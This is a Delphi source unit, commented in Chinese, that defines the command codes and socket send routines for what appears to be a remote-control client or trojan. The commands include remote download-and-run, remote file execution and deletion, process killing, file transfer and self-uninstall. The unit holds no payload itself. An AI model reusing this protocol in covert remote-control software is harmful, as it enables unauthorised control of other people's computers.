{
  通用数据单元
}
unit VarUnit;

interface

uses
  Windows, Winsock, SocketUnit;


const
  Sock_Error        = $0FFFFFFF;
  Sock_Close        = $00FFFFFF;
  MIN_BUFFER_SIZE   = 4;
  MinEx_BUFFER_SIZE = 8;

const
  //  管理命令
  Client_Online = $AABB01FF;      //  在线命令
  Client_Ping   = $AABB0101;      //  PIng命令
  Client_Close  = $AABB0102;      //  关闭Client命令
  Client_Remove = $AABB0103;      //  卸载Client命令
  Client_Test   = $AABB0199;      //  测试对话框

  //  单一命令
  Client_Download       = $AABB0201;  //  下载远程连接+Run
  //  Process Manager
  Client_GetProcessList = $AABB0202;  //  获取进程列表
  Client_KillProcess    = $AABB0203;  //  杀死进程

  //  文件浏览命令
  Get_DiskList  = $AABB0301;      //  获取磁盘列表
  Get_DirList   = $AABB0302;      //  获取目录列表
  Get_FileList  = $AABB0303;      //  获取文件列表

  //  文件管理命令
  File_Execute  = $AABB0304;      //  远程执行文件
  File_Delete   = $AABB0305;      //  文件删除
  Dir_New       = $AABB0306;      //  新建文件夹
  Dir_Delete    = $AABB0307;      //  删除文件夹

  //  文件传输命令
  File_UploadBegin    = $AABB0308;  //  文件上传开始
  File_UploadEnd      = $AABB0309;  //  上传完毕
  File_DownLoadBegin  = $AABB030A;  //  文件开始下载
  File_DownloadEnd    = $AABB030B;  //  文件下载完毕
  File_IO_Error       = $AABB03FF;  //  I/O错误

Type
  //  最小化(命令)数据包
  TMinBufferHeader = Record
    dwSocketCmd: DWORD;
  end;
  PMinBufferHeader = ^TMinBufferHeader;
  
  //  数据长度数据包
  TMinExBufferHeader = Record
    dwSocketCmd: DWORD;
    dwBufferSize: DWORD;
  end;
  PMinExBufferHeader = ^TMinExBufferHeader;

function MakeSocketCmd(dwSockCmd: DWORD): String;

function SendData(MasterSocket: TClientSocket; StrData: String): Boolean; overload;
function SendData(MasterSocket: TClientSocket; dwSocketCmd: DWORD; StrData: String): Boolean; overload;

implementation

function MakeSocketCmd(dwSockCmd: DWORD): String;
var
  lpChar: Pchar;
begin
  lpChar := @dwSockCmd;
  Result := lpChar[0] + lpChar[1] + lpChar[2] + lpChar[3];
end;

//  发送函数
function SendData(MasterSocket: TClientSocket; StrData: String): Boolean;
var
  Results: Integer;
begin
  Sleep(1);
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
  else
    Result := True;
  end;
end;

//  发送函数
function SendData(MasterSocket: TClientSocket; dwSocketCmd: DWORD; StrData: String): Boolean;
var
  Results: Integer;
begin
  Sleep(1);
  StrData := MakeSocketCmd(dwSocketCmd) + StrData;
  Results := MasterSocket.SendString(StrData);
  case Results of
    SOCKET_ERROR: Result := False;
  else
    Result := True;
  end;
end;


end.
